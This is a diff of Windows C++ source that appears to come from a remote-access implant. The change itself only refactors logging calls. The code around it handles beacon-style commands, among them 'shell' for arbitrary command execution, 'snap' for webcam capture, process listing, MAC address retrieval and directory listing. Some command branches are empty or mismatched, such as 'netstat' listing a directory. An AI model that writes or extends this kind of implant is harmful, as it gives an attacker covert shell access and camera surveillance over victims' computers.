@@ -21,10 +21,10 @@
 
 std::string executeShellCommand(const char* cmd) {
     std::array<char, 2048> buffer;
-    logger("Executing shell command: " + std::string(cmd));
+    logger.log("Executing shell command: " + std::string(cmd));
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
     if (!pipe) {
-        log_error("_popen() failed!");
+        logger.error("_popen() failed!");
         throw std::runtime_error("_popen() failed!");
     }
     std::string result;
@@ -40,7 +40,7 @@ std::string listProcesses() {
     HANDLE hProcessSnap;
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        log_error("Unable to create toolhelp snapshot!");
+        logger.error("Unable to create toolhelp snapshot!");
         return "Error: Unable to create toolhelp snapshot!";
     }
 
@@ -48,7 +48,7 @@ std::string listProcesses() {
     pe32.dwSize = sizeof(PROCESSENTRY32);
     if (!Process32First(hProcessSnap, &pe32)) {
         CloseHandle(hProcessSnap);
-        log_error("Unable to retrieve process information!");
+        logger.error("Unable to retrieve process information!");
         return "Error: Unable to retrieve process information!";
     }
     do {
@@ -66,7 +66,7 @@ std::string getMacAddress() {
         AdapterInfo,                      
         &dwBufLen);                      
     if (dwStatus != ERROR_SUCCESS) {
-        log_error("Error retrieving MAC address");
+        logger.error("Error retrieving MAC address");
         return "Error retrieving MAC address";
     }
 
@@ -120,7 +120,7 @@ std::string listDirectory(const std::string& directory) {
     HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);
 
     if (hFind == INVALID_HANDLE_VALUE) {
-        log_error("Error opening directory: " + directory);
+        logger.error("Error opening directory: " + directory);
         return "Error opening directory: " + directory;
     }
 
@@ -164,7 +164,7 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "switch_beacon") {
     } else if (command == "shell") {
         std::string output = executeShellCommand(command_data.c_str());
-        logger("Shell command output: " + output);
+        logger.log("Shell command output: " + output);
     } else if (command == "list_processes") {
     } else if (command == "systeminfo") {
         std::string output = getSystemInfo();
@@ -180,14 +180,15 @@ std::string command_handler(const std::string& command, const std::string& comma
     } else if (command == "list_services") {
     } else if (command == "disk_usage") {
     } else if (command == "netstat") {
-        log_error("Unknown command: " + command);
+        logger.error("Unknown command: " + command);
         std::string output = listDirectory(command_data.c_str());
         return output;
     } else if (command == "snap") {
         CapturePhoto(L"test.jpg");
         return "Picture taken";
     } else {
-        log_error("Unknown command: " + command);
+        logger.error("Unknown command: " + command);
     return "not a supported command";
     }
+    return "error";
 }
